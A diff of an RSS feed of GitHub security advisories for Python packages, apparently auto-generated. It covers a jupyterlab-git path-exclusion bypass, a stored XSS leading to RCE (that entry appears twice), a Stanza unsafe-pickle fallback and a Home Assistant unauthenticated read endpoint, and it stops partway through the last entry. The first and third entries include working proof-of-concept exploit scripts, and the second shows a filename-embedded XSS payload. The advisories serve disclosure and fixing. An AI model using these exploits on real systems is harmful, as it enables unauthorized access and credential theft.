@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-06-19T19:30:23.076Z</updated>
+    <updated>2026-06-19T20:28:10.798Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,814 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[jupyterlab-git] jupyterlab-git excluded_paths Case-Sensitivity Bypass Allows Reading Excluded Directories]]></title>
+        <id>https://github.com/advisories/GHSA-436q-jwfr-rm2h</id>
+        <link href="https://github.com/advisories/GHSA-436q-jwfr-rm2h"/>
+        <updated>2026-06-19T19:36:22.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>jupyterlab-git</code> 0.53.0 (latest, 2026-04-30) uses <code>fnmatch.fnmatchcase()</code> in <code>GitHandler.prepare()</code> (<code>jupyterlab_git/handlers.py:91</code>) to enforce the admin-configured <code>excluded_paths</code> security control. Because <code>fnmatchcase</code> is unconditionally case-sensitive, an authenticated user on a case-insensitive filesystem (macOS APFS, Windows NTFS) can bypass the exclusion by varying the case of the URL path segment — e.g. requesting <code>/git/project/Secrets/...</code> instead of <code>/git/project/secrets/...</code> — gaining read access to git history, file content, and status in directories the administrator explicitly excluded.</p>
+<h2 id="vulnerable-code">Vulnerable Code</h2>
+<pre><code class="language-python"># jupyterlab_git/handlers.py:84-92
+async def prepare(self):
+    """Check if the path should be skipped"""
+    await ensure_async(super().prepare())
+    path = self.path_kwargs.get("path")
+    if path is not None:
+        excluded_paths = self.git.excluded_paths
+        for excluded_path in excluded_paths:
+            if fnmatch.fnmatchcase(path, excluded_path):  # ← always case-sensitive
+                raise tornado.web.HTTPError(404)
+</code></pre>
+<h2 id="root-cause">Root Cause</h2>
+<p><code>fnmatch.fnmatchcase()</code> is unconditionally case-sensitive regardless of the operating system. Contrast with <code>fnmatch.fnmatch()</code> which normalizes via <code>os.path.normcase()</code> on case-insensitive platforms.</p>
+<pre><code class="language-python">fnmatch.fnmatchcase("/project/secrets", "/project/secrets")  # True  — blocked
+fnmatch.fnmatchcase("/project/Secrets", "/project/secrets")  # False — bypasses check
+</code></pre>
+<p>On macOS APFS and Windows NTFS, <code>/project/Secrets</code> and <code>/project/secrets</code> resolve to the same directory on disk. The exclusion check rejects only the exact-case match, but the downstream <code>url2localpath()</code> resolves the case-varied path to the same filesystem location.</p>
+<h2 id="impact">Impact</h2>
+<p>An authenticated JupyterLab user with access to the affected Jupyter server can bypass admin-configured <code>excluded_paths</code> by varying the case of the URL path segment. This grants:</p>
+<ul>
+<li>Read file content at any git ref (<code>/content</code> endpoint)</li>
+<li>Read working tree files in the excluded directory</li>
+<li>View git status, log, diff on the excluded path</li>
+<li>Enumerate commits touching excluded files</li>
+</ul>
+<h2 id="attack-scenario">Attack Scenario</h2>
+<ol>
+<li>Admin configures <code>c.JupyterLabGit.excluded_paths = ["/project/secrets", "/project/secrets/*"]</code></li>
+<li>Normal request <code>POST /git/project/secrets/status</code> → HTTP 404 (blocked)</li>
+<li>Attacker requests <code>POST /git/project/Secrets/status</code> → HTTP 200 (bypass)</li>
+<li>Attacker reads secret: <code>POST /git/project/Secrets/content</code> with <code>{"filename": "./cred.txt", "reference": {"git": "HEAD"}}</code> → file content returned</li>
+</ol>
+<h2 id="exploit">Exploit</h2>
+<p>See <code>poc.py</code>. Starts a real jupyter-server with jupyterlab-git loaded, configures <code>excluded_paths</code>, and demonstrates bypass + exfiltration via HTTP.</p>
+<pre><code class="language-python">import json, os, shutil, subprocess, sys, tempfile, time
+import urllib.request, urllib.error
+
+from jupyterlab_git.handlers import GitHandler  # real import, no mock
+from jupyterlab_git_core.git import Git
+import jupyterlab_git_core
+
+PORT = 18895
+TOKEN = "xtoken"
+BASE_URL = f"http://127.0.0.1:{PORT}"
+SECRET = "sk-PROD-a8f2x9q-LIVE-KEY"
+
+
+def post(path_seg, endpoint, body=None):
+    url = f"{BASE_URL}/git/{path_seg}{endpoint}"
+    data = json.dumps(body or {}).encode()
+    req = urllib.request.Request(url, data=data, method="POST",
+        headers={"Authorization": f"token {TOKEN}", "Content-Type": "application/json"})
+    try:
+        resp = urllib.request.urlopen(req, timeout=10)
+        return resp.status, json.loads(resp.read())
+    except urllib.error.HTTPError as e:
+        return e.code, e.read().decode()
+
+
+def main():
+    base_dir = tempfile.mkdtemp(prefix="jlgit_")
+    workspace = os.path.join(base_dir, "workspace")
+    repo_dir = os.path.join(workspace, "project")
+    secret_dir = os.path.join(repo_dir, "secrets")
+    os.makedirs(secret_dir)
+
+    with open(os.path.join(secret_dir, "cred.txt"), "w") as f:
+        f.write(SECRET + "\n")
+
+    git_env = {**os.environ, "GIT_AUTHOR_NAME": "a", "GIT_AUTHOR_EMAIL": "a@x",
+               "GIT_COMMITTER_NAME": "a", "GIT_COMMITTER_EMAIL": "a@x"}
+    subprocess.run(["git", "init"], cwd=repo_dir, capture_output=True, check=True)
+    subprocess.run(["git", "add", "."], cwd=repo_dir, capture_output=True, check=True)
+    subprocess.run(["git", "commit", "-m", "init"], cwd=repo_dir,
+                   capture_output=True, check=True, env=git_env)
+
+    config_path = os.path.join(base_dir, "jupyter_server_config.py")
+    with open(config_path, "w") as f:
+        f.write(f'c.ServerApp.root_dir = "{workspace}"\n')
+        f.write(f'c.ServerApp.token = "{TOKEN}"\n')
+        f.write(f'c.ServerApp.open_browser = False\n')
+        f.write(f'c.ServerApp.port = {PORT}\n')
+        f.write(f'c.ServerApp.ip = "127.0.0.1"\n')
+        f.write(f'c.ServerApp.disable_check_xsrf = True\n')
+        f.write(f'c.JupyterLabGit.excluded_paths = ["/project/secrets", "/project/secrets/*"]\n')
+
+    env = os.environ.copy()
+    env["JUPYTER_CONFIG_DIR"] = base_dir
+    env["JUPYTER_DATA_DIR"] = base_dir
+    proc = subprocess.Popen(
+        [sys.executable, "-m", "jupyter_server", f"--config={config_path}",
+         "--ServerApp.jpserver_extensions={'jupyterlab_git': True}"],
+        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env, cwd=base_dir)
+
+    for _ in range(30):
+        try:
+            req = urllib.request.Request(f"{BASE_URL}/api/status",
+                                         headers={"Authorization": f"token {TOKEN}"})
+            if urllib.request.urlopen(req, timeout=2).status == 200:
+                break
+        except (urllib.error.URLError, OSError):
+            pass
+        time.sleep(0.5)
+    else:
+        proc.kill()
+        shutil.rmtree(base_dir, ignore_errors=True)
+        sys.exit("server failed to start")
+
+    try:
+        # exclusion works
+        code, _ = post("project/secrets", "/status")
+        blocked = code == 404
+
+        # bypass
+        code, _ = post("project/Secrets", "/status")
+        bypassed = code == 200
+
+        # exfiltrate
+        code, body = post("project/Secrets", "/content",
+                          {"filename": "./cred.txt", "reference": {"git": "HEAD"}})
+        content = body.get("content", "") if isinstance(body, dict) else ""
+        exfiltrated = SECRET in content
+
+        ok = blocked and bypassed and exfiltrated
+        print(f"exclusion enforced (lowercase): {blocked}")
+        print(f"bypass (case-varied):           {bypassed}")
+        print(f"secret exfiltrated:             {exfiltrated}")
+        print(f"result:                         {'VULNERABLE' if ok else 'NOT CONFIRMED'}")
+        return ok
+
+    finally:
+        proc.terminate()
+        proc.wait(timeout=5)
+        shutil.rmtree(base_dir, ignore_errors=True)
+
+
+if __name__ == "__main__":
+    sys.exit(0 if main() else 1)
+</code></pre>
+<pre><code class="language-bash">pip install 'jupyterlab-git==0.53.0'
+python poc.py
+</code></pre>
+<img width="686" height="146" alt="image" src="https://github.com/user-attachments/assets/f5b8d349-539a-44d7-9b17-d13b5f802625">
+
+
+<h2 id="fix">Fix</h2>
+<pre><code class="language-python">if fnmatch.fnmatch(path.lower(), excluded_path.lower()):
+    raise tornado.web.HTTPError(404)
+</code></pre>
+<p>Or apply <code>os.path.normcase()</code> to both operands before comparison.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/jupyterlab/jupyterlab-git/security/advisories/GHSA-436q-jwfr-rm2h">https://github.com/jupyterlab/jupyterlab-git/security/advisories/GHSA-436q-jwfr-rm2h</a></li>
+<li><a href="https://github.com/advisories/GHSA-436q-jwfr-rm2h">https://github.com/advisories/GHSA-436q-jwfr-rm2h</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-436q-jwfr-rm2h</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-19T19:36:22.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[jupyterlab-git-core] jupyterlab-git extension: Stored XSS leading to RCE]]></title>
+        <id>https://github.com/advisories/GHSA-f962-v9hr-pfg5</id>
+        <link href="https://github.com/advisories/GHSA-f962-v9hr-pfg5"/>
+        <updated>2026-06-19T19:36:06.000Z</updated>
+        <content type="html"><![CDATA[<p>Overview</p>
+<p>Amazon Web Services (AWS) Security has identified a stored cross-site scripting (XSS) issue in the jupyterlab-git JupyterLab extension that can lead to remote code execution (RCE). The issue exists in the&nbsp;PlainTextDiff.ts component, where the createHeader() method passes Git filenames directly to innerHTML without sanitization when rendering diffs for renamed files in commit history. This allows an adversary to&nbsp;craft a filename containing arbitrary HTML/JavaScript that executes when another user views the rename diff in the Git History tab.</p>
+<p>The issue can be leveraged through the rename history view in the JupyterLab Git panel. An adversary creates a file with a crafted filename containing a JavaScript payload (e.g.,&nbsp;&lt;img src=x onerror=eval(atob("base64_payload"))&gt;.py), renames the file in a subsequent commit, and pushes to a shared repository. When a victim clones the repository, navigates to the Git History tab, clicks the&nbsp;rename commit, and then clicks the renamed file to view the diff, the unsanitized filename renders via innerHTML, executing arbitrary JavaScript in the victim's browser session. The injected JavaScript reads the&nbsp;xsrf cookie, opens a JupyterLab terminal via POST /api/terminals, connects via WebSocket, and executes arbitrary shell commands — achieving full RCE. An adversary can leverage this to exfiltrate secrets or&nbsp;credentials from the victim's environment.</p>
+<p>Scope of impact</p>
+<p>We discovered this issue during internal security testing. The issue is present in the default configuration of JupyterLab when the jupyterlab-git extension is installed.</p>
+<p>The attack requires:</p>
+<ul>
+<li><p>The adversary to have commit access to a Git repository that the victim has cloned</p>
+</li>
+<li><p>The victim to navigate to the Git History tab, click the rename commit, and&nbsp;click the renamed file to view the diff</p>
+</li>
+</ul>
+<p>The issue could allow an actor who has access to a shared Git repository to execute arbitrary JavaScript in another user's JupyterLab environment by committing a file with a crafted filename, potentially leading to remote code execution with access to user code, data, environment variables, and credentials.</p>
+<p>Proof of concept</p>
+<p>The issue exists in the createHeader() method where filenames from rename history are passed directly to innerHTML without sanitization:</p>
+<p>[1] <a href="https://github.com/jupyterlab/jupyterlab-git/blob/main/src/components/diff/PlainTextDiff.ts#L214">https://github.com/jupyterlab/jupyterlab-git/blob/main/src/components/diff/PlainTextDiff.ts#L214</a></p>
+<p>Attack flow:</p>
+<ol>
+<li><p>An adversary creates a file with a crafted filename containing a JavaScript payload, e.g., &lt;img src=x onerror=eval(atob("base64_payload"))&gt;.py</p>
+</li>
+<li><p>The adversary renames the file in a subsequent commit and pushes both commits to a shared Git repository</p>
+</li>
+<li><p>The victim clones or pulls the repository and navigates to the Git History tab in JupyterLab</p>
+</li>
+<li><p>The victim clicks the rename commit, then clicks the renamed file to view the diff</p>
+</li>
+<li><p>The createHeader() method constructs a diff header using string concatenation with the unsanitized filename and assigns the result to innerHTML</p>
+</li>
+<li><p>The injected JavaScript executes in the victim's browser session, reads the _xsrf cookie, sends a POST request to /api/terminals to open a JupyterLab terminal, connects via WebSocket, and executes arbitrary&nbsp;shell commands</p>
+</li>
+</ol>
+<p>Proof-of-concept mitigation</p>
+<p>The issue can be mitigated by replacing innerHTML with textContent for filename rendering in the createHeader() method of PlainTextDiff.ts. Alternatively, proper HTML sanitization (escaping &lt;, &gt;, &amp;, ", ') can be&nbsp;applied before inserting user-controlled filenames into the DOM.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/jupyterlab/jupyterlab-git/security/advisories/GHSA-f962-v9hr-pfg5">https://github.com/jupyterlab/jupyterlab-git/security/advisories/GHSA-f962-v9hr-pfg5</a></li>
+<li><a href="https://github.com/advisories/GHSA-f962-v9hr-pfg5">https://github.com/advisories/GHSA-f962-v9hr-pfg5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-f962-v9hr-pfg5</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-19T19:36:04.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[jupyterlab-git] jupyterlab-git extension: Stored XSS leading to RCE]]></title>
+        <id>https://github.com/advisories/GHSA-f962-v9hr-pfg5</id>
+        <link href="https://github.com/advisories/GHSA-f962-v9hr-pfg5"/>
+        <updated>2026-06-19T19:36:06.000Z</updated>
+        <content type="html"><![CDATA[<p>Overview</p>
+<p>Amazon Web Services (AWS) Security has identified a stored cross-site scripting (XSS) issue in the jupyterlab-git JupyterLab extension that can lead to remote code execution (RCE). The issue exists in the&nbsp;PlainTextDiff.ts component, where the createHeader() method passes Git filenames directly to innerHTML without sanitization when rendering diffs for renamed files in commit history. This allows an adversary to&nbsp;craft a filename containing arbitrary HTML/JavaScript that executes when another user views the rename diff in the Git History tab.</p>
+<p>The issue can be leveraged through the rename history view in the JupyterLab Git panel. An adversary creates a file with a crafted filename containing a JavaScript payload (e.g.,&nbsp;&lt;img src=x onerror=eval(atob("base64_payload"))&gt;.py), renames the file in a subsequent commit, and pushes to a shared repository. When a victim clones the repository, navigates to the Git History tab, clicks the&nbsp;rename commit, and then clicks the renamed file to view the diff, the unsanitized filename renders via innerHTML, executing arbitrary JavaScript in the victim's browser session. The injected JavaScript reads the&nbsp;xsrf cookie, opens a JupyterLab terminal via POST /api/terminals, connects via WebSocket, and executes arbitrary shell commands — achieving full RCE. An adversary can leverage this to exfiltrate secrets or&nbsp;credentials from the victim's environment.</p>
+<p>Scope of impact</p>
+<p>We discovered this issue during internal security testing. The issue is present in the default configuration of JupyterLab when the jupyterlab-git extension is installed.</p>
+<p>The attack requires:</p>
+<ul>
+<li><p>The adversary to have commit access to a Git repository that the victim has cloned</p>
+</li>
+<li><p>The victim to navigate to the Git History tab, click the rename commit, and&nbsp;click the renamed file to view the diff</p>
+</li>
+</ul>
+<p>The issue could allow an actor who has access to a shared Git repository to execute arbitrary JavaScript in another user's JupyterLab environment by committing a file with a crafted filename, potentially leading to remote code execution with access to user code, data, environment variables, and credentials.</p>
+<p>Proof of concept</p>
+<p>The issue exists in the createHeader() method where filenames from rename history are passed directly to innerHTML without sanitization:</p>
+<p>[1] <a href="https://github.com/jupyterlab/jupyterlab-git/blob/main/src/components/diff/PlainTextDiff.ts#L214">https://github.com/jupyterlab/jupyterlab-git/blob/main/src/components/diff/PlainTextDiff.ts#L214</a></p>
+<p>Attack flow:</p>
+<ol>
+<li><p>An adversary creates a file with a crafted filename containing a JavaScript payload, e.g., &lt;img src=x onerror=eval(atob("base64_payload"))&gt;.py</p>
+</li>
+<li><p>The adversary renames the file in a subsequent commit and pushes both commits to a shared Git repository</p>
+</li>
+<li><p>The victim clones or pulls the repository and navigates to the Git History tab in JupyterLab</p>
+</li>
+<li><p>The victim clicks the rename commit, then clicks the renamed file to view the diff</p>
+</li>
+<li><p>The createHeader() method constructs a diff header using string concatenation with the unsanitized filename and assigns the result to innerHTML</p>
+</li>
+<li><p>The injected JavaScript executes in the victim's browser session, reads the _xsrf cookie, sends a POST request to /api/terminals to open a JupyterLab terminal, connects via WebSocket, and executes arbitrary&nbsp;shell commands</p>
+</li>
+</ol>
+<p>Proof-of-concept mitigation</p>
+<p>The issue can be mitigated by replacing innerHTML with textContent for filename rendering in the createHeader() method of PlainTextDiff.ts. Alternatively, proper HTML sanitization (escaping &lt;, &gt;, &amp;, ", ') can be&nbsp;applied before inserting user-controlled filenames into the DOM.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/jupyterlab/jupyterlab-git/security/advisories/GHSA-f962-v9hr-pfg5">https://github.com/jupyterlab/jupyterlab-git/security/advisories/GHSA-f962-v9hr-pfg5</a></li>
+<li><a href="https://github.com/advisories/GHSA-f962-v9hr-pfg5">https://github.com/advisories/GHSA-f962-v9hr-pfg5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-f962-v9hr-pfg5</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-19T19:36:04.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[stanza] Stanza: Remote Code Execution via Unsafe Pickle Deserialization in Model Loaders]]></title>
+        <id>https://github.com/advisories/GHSA-v5jw-96jm-7h2c</id>
+        <link href="https://github.com/advisories/GHSA-v5jw-96jm-7h2c"/>
+        <updated>2026-06-19T19:35:55.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Stanza 1.12.0 attempts to safely load PyTorch checkpoint files using <code>torch.load(..., weights_only=True)</code>, but automatically falls back to the fully unsafe <code>torch.load(..., weights_only=False)</code> when the safe load raises <code>pickle.UnpicklingError</code>. Because the <code>UnpicklingError</code> condition is fully attacker-controllable, any <code>.pt</code> file that contains a single unsupported pickle global will trigger it.</p>
+<p>An attacker who can place a malicious pretrain or model file on disk (via supply-chain compromise, a poisoned model repository, or a shared model cache) can achieve arbitrary code execution on any machine that loads a Stanza NLP pipeline. </p>
+<p>Code execution occurs inside the Stanza pretrain-loading API, not merely by calling <code>torch.load</code> directly.</p>
+<h3 id="details">Details</h3>
+<p>The vulnerable code is in <a href="https://github.com/stanfordnlp/stanza/blob/main/stanza/models/common/pretrain.py#L59-L67">pretrain.py#L59-L67</a> (Stanza 1.12.0):</p>
+<pre><code class="language-python">try:
+    data = torch.load(self.filename, lambda storage, loc: storage, weights_only=True)
+except UnpicklingError:
+    data = torch.load(self.filename, lambda storage, loc: storage, weights_only=False)
+</code></pre>
+<p>When <code>weights_only=True</code> is passed, PyTorch's deserializer raises <code>pickle.UnpicklingError</code> for any object whose class or callable is not on the safe-globals allowlist. This is the intended safety mechanism. However, Stanza catches that exception and immediately reloads the <strong>same attacker-controlled file</strong> with <code>weights_only=False</code>, which invokes Python's full pickle deserializer and executes any <code>__reduce__</code> method in the file without restriction.</p>
+<p>The fallback is triggered reliably and intentionally: an attacker embeds one unsupported pickle global (e.g., <code>builtins.open</code>) anywhere in an otherwise structurally valid Stanza pretrain state dict. The safe load rejects it; the unsafe reload runs it.</p>
+<p><strong>The same try/except pattern exists in at least five additional loaders in Stanza 1.12.0:</strong></p>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Lines</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>stanza/models/common/pretrain.py</code></td>
+<td>64–66</td>
+</tr>
+<tr>
+<td><code>stanza/models/coref/model.py</code></td>
+<td>251–253, 329–331</td>
+</tr>
+<tr>
+<td><code>stanza/models/classifiers/trainer.py</code></td>
+<td>80–82</td>
+</tr>
+<tr>
+<td><code>stanza/models/constituency/base_trainer.py</code></td>
+<td>94–96</td>
+</tr>
+</tbody></table>
+<p>Additionally, <code>stanza/models/lemma_classifier/base_model.py:127</code> calls <code>torch.load(filename, lambda storage, loc: storage)</code> with no <code>weights_only</code> argument at all, which defaults to <code>False</code> on any PyTorch &lt; 2.6.</p>
+<p>The call chain from the public API to the vulnerable fallback is:</p>
+<pre><code>stanza.models.common.foundation_cache.load_pretrain(path)
+  → FoundationCache.load_pretrain(path)
+    → stanza.models.common.pretrain.Pretrain(filename)
+      → Pretrain.emb  (property access triggers load)
+        → Pretrain.load()
+          → torch.load(..., weights_only=True)   # raises UnpicklingError
+          → torch.load(..., weights_only=False)  # executes arbitrary pickle
+</code></pre>
+<hr>
+<h3 id="poc">PoC</h3>
+<p><strong>Environment:</strong> Python 3.11, <code>stanza==1.12.0</code>, <code>torch==2.12.0</code></p>
+<p><strong>Step 1: Install dependencies:</strong></p>
+<pre><code class="language-bash">pip install stanza==1.12.0 torch==2.12.0
+</code></pre>
+<p><strong>Step 2: Save the following as <code>exploit.py</code>:</strong></p>
+<pre><code class="language-python">import os
+from pathlib import Path
+
+import torch
+import stanza
+from stanza.models.common.foundation_cache import FoundationCache, load_pretrain
+from stanza.models.common.vocab import VOCAB_PREFIX
+
+SENTINEL = "/tmp/stanza_rce_proof"
+MODEL    = "/tmp/stanza_malicious.pt"
+
+class HarmlessPayload:
+    """Demonstrates execution; writes a sentinel file."""
+    def __init__(self, path):
+        self.path = path
+    def __reduce__(self):
+        return (open, (self.path, "w"))
+
+# Build a structurally valid Stanza pretrain state dict with the payload embedded.
+words = VOCAB_PREFIX + ["hello"]
+state = {
+    "vocab": {
+        "lang": "", "idx": 0, "cutoff": 0, "lower": False,
+        "_id2unit": words,
+        "_unit2id": {w: i for i, w in enumerate(words)},
+    },
+    "emb": torch.zeros((len(words), 2), dtype=torch.float32),
+    "payload": HarmlessPayload(SENTINEL),   # ← the malicious object
+}
+torch.save(state, MODEL)
+
+# Confirm safe-only load raises UnpicklingError and does NOT create sentinel.
+try:
+    torch.load(MODEL, lambda s, l: s, weights_only=True)
+    print("UNEXPECTED: safe load succeeded (no fallback needed)")
+except Exception as e:
+    print(f"Control: safe load raised {type(e).__name__} : sentinel exists: {Path(SENTINEL).exists()}")
+
+# Load through the real Stanza API. The fallback fires and the sentinel is created.
+cache   = FoundationCache()
+pretrain = load_pretrain(MODEL, foundation_cache=cache)
+
+print(f"stanza={stanza.__version__}  torch={torch.__version__}")
+print(f"emb_shape={tuple(pretrain.emb.shape)}")
+print(f"sentinel_exists={Path(SENTINEL).exists()}")
+print("VERDICT: ACTUAL_VULN_REAL_STANZA_PATH" if Path(SENTINEL).exists() else "VERDICT: UNPROVEN")
+</code></pre>
+<p><strong>Step 3 : Run:</strong></p>
+<pre><code class="language-bash">python exploit.py
+</code></pre>
+<p><strong>Expected output (confirmed):</strong></p>
+<pre><code>Control: safe load raised UnpicklingError : sentinel exists: False
+stanza=1.12.0  torch=2.12.0
+emb_shape=(5, 2)
+sentinel_exists=True
+VERDICT: ACTUAL_VULN_REAL_STANZA_PATH
+</code></pre>
+<p>The sentinel is created exclusively by the Stanza pretrain-loading API invoking the unsafe fallback : not by a direct <code>torch.load</code> call in the PoC.</p>
+<hr>
+<h3 id="impact">Impact</h3>
+<p><strong>Vulnerability class:</strong> CWE-502 : Deserialization of Untrusted Data</p>
+<p><strong>Who is impacted:</strong> Any user, researcher, CI/CD pipeline, or production NLP service that loads a Stanza model pretrain file from a source that is not under the victim's exclusive cryptographic control. Concretely:</p>
+<ul>
+<li>Developers who run <code>stanza.Pipeline(lang)</code> after downloading models from HuggingFace or GitHub</li>
+<li>CI pipelines that automatically refresh Stanza models during builds</li>
+<li>Research environments that share pretrain files over shared network storage or model repositories</li>
+</ul>
+<p><strong>Attack prerequisites:</strong> The attacker must be able to place a malicious <code>.pt</code> pretrain file at a path that Stanza will load. Realistic delivery vectors include:</p>
+<ul>
+<li>Compromise of a HuggingFace model repository hosting Stanza pretrain weights</li>
+<li>Poisoning of a shared model cache directory (NFS, S3, artifact store)</li>
+<li>A malicious pretrain file distributed via a third-party fine-tuning hub or research repo</li>
+</ul>
+<p><strong>What an attacker achieves:</strong> Arbitrary code execution with the full privileges of the process running <code>stanza.Pipeline()</code>, typically a developer workstation, a Jupyter notebook server, or a GPU training node. This allows credential theft (HuggingFace tokens, cloud IAM keys from environment variables), persistent backdoors, data exfiltration, and lateral movement in multi-tenant training infrastructure.</p>
+<p><strong>Recommended fix:</strong></p>
+<p>Remove the unsafe fallback entirely. If <code>weights_only=True</code> raises <code>UnpicklingError</code>, fail closed:</p>
+<pre><code class="language-python">try:
+    data = torch.load(self.filename, lambda storage, loc: storage, weights_only=True)
+except UnpicklingError as e:
+    raise RuntimeError(
+        f"Refusing to load legacy pretrain file {self.filename!r} with unsafe "
+        "deserialization. Regenerate the file using a trusted Stanza migration tool."
+    ) from e
+</code></pre>
+<p>If legacy NumPy-containing pretrain files must be supported, use PyTorch's <code>add_safe_globals()</code> API to allowlist the specific NumPy dtypes required, rather than disabling all safety checks. Apply the same fix to all six affected loaders listed above.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/stanfordnlp/stanza/security/advisories/GHSA-v5jw-96jm-7h2c">https://github.com/stanfordnlp/stanza/security/advisories/GHSA-v5jw-96jm-7h2c</a></li>
+<li><a href="https://github.com/advisories/GHSA-v5jw-96jm-7h2c">https://github.com/advisories/GHSA-v5jw-96jm-7h2c</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-v5jw-96jm-7h2c</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-19T19:35:54.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[homeassistant] Home Assistant: Konnected alarm-panel switch state and zone topology disclosed to unauthenticated actors on the LAN]]></title>
+        <id>https://github.com/advisories/GHSA-x84v-g949-293w</id>
+        <link href="https://github.com/advisories/GHSA-x84v-g949-293w"/>
+        <updated>2026-06-19T19:35:48.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The Konnected integration registers an HTTP endpoint, <code>KonnectedView</code> (<code>homeassistant/components/konnected/__init__.py</code>), that is marked as <strong>not requiring authentication</strong> (<code>requires_auth = False</code>). A comment next to that line says auth is instead handled "via the access token from configuration."</p>
+<p>That promise is only half true:</p>
+<ul>
+<li><strong>Write requests (POST and PUT)</strong> are handled by <code>update_sensor()</code>, which <em>does</em> check the request's <code>Authorization: Bearer &lt;token&gt;</code> header against the integration's stored access tokens (using <code>hmac.compare_digest</code>).</li>
+<li><strong>Read requests (GET)</strong> are handled by a separate <code>get()</code> method that has <strong>no authentication check at all.</strong></li>
+</ul>
+<p>By sending GET requests to <code>/api/konnected/device/{device_id}?zone=N</code>, any unauthenticated client on the LAN can:</p>
+<ol>
+<li><strong>Enumerate configured Konnected device IDs</strong> — the endpoint returns a clean 404-vs-200 difference that acts as an oracle for which devices exist.</li>
+<li><strong>Read switch output states</strong> — the on/off state of every switch output (siren, strobe, and relay outputs of the alarm panel).</li>
+<li><strong>Read the panel's zone topology</strong> — how the alarm panel's zones are configured.</li>
+<li><strong>Trigger panel connections</strong> — each unauthenticated GET forces one outbound <code>panel.async_connect()</code> call to the Konnected hardware on the LAN.</li>
+</ol>
+<p>The same URL that correctly rejects unauthenticated POST and PUT requests silently serves unauthenticated GET requests, leaking alarm-panel state and device topology to anyone who can reach Home Assistant's HTTP port (8123 on the LAN by default).</p>
+<h3 id="details">Details</h3>
+<p>This is the threat-model boundary "unauth to auth" the upstream security policy treats as fileable. The same boundary produced CVE-2026-34205 (<code>Unauthenticated app endpoints exposed to local network via host network mode</code>, CVSS 9.7 CRITICAL, March 2026) and CVE-2023-50715 (<code>User accounts disclosed to unauthenticated actors on the LAN</code>, CVSS 4.2 MODERATE, December 2023). The Konnected gap is structurally identical: a HomeAssistantView with <code>requires_auth = False</code> that returns information about configured devices to anyone who can reach the HTTP port.</p>
+<p>Confirmed end-to-end against <code>ghcr.io/home-assistant/home-assistant:2026.5.2</code>. The Proof of Concept section below has seven captures. Step 1 cites the three load-bearing source ranges (view registration, the auth check that only POST/PUT use, the GET handler that omits it). Step 2 is the control: POST and PUT on the same URL return <code>401 unauthorized</code> without a Bearer token, proving the integration does have an auth check, just only on the write methods. Step 3 is the bug: GET on the same URL with no Authorization header returns <code>200 {"zone":"5","state":1}</code> for the siren-output zone, equivalent payload for the strobe and relay-output zones. Step 4 exercises the enumeration oracle: unknown <code>device_id</code> returns a 404 with a distinct message from a known <code>device_id</code> with an unknown zone, which a brute-forcer uses to map the device-ID and zone space. Step 5 captures the connection-amplification side effect by firing 10 unauthenticated GETs and observing 10 <code>panel.async_connect()</code> invocations on the panel side. Step 6 shows that a deliberately wrong <code>Authorization</code> header produces the same response as no header at all, confirming the auth header is not consulted on GET. Step 7 captures the HA startup log line that registers <code>KonnectedView</code>.</p>
+<h3 id="threat-model">Threat model</h3>
+<p>Home Assistant's HTTP server binds to the LAN at port 8123 by default. A Konnected alarm panel is a wired smart-home hardware product whose primary use case is <em>alarm and security</em>: zones 1-6 typically read door/window/glass-break sensors, switches 5-8 drive siren, strobe, and relay outputs that control the alarm itself or external systems such as garage-door openers, entry chimes, or armed-disable interlocks. The state an attacker reads through this bug is precisely the live status of those outputs and inputs.</p>
+<p>The attacker model upstream policy explicitly treats as in-scope is the LAN-adjacent unauthenticated client: a guest who joined the wifi, a neighbor on shared coffee-shop wifi, a malicious device that reached the LAN via a separately compromised IoT product, an attacker who landed via a flat office network, or an attacker who pivoted from a VPN endpoint. None of these positions grant an access token. All of them grant the network reachability the bug requires.</p>
+<p>The same endpoint is the receiver for legitimate push updates from the Konnected hardware, which is why <code>requires_auth = False</code> exists in the first place. The intent was to enforce a shared access token on the body. That intent is present in <code>update_sensor()</code> and absent in <code>get()</code>.</p>
+<h3 id="impact">Impact</h3>
+<ul>
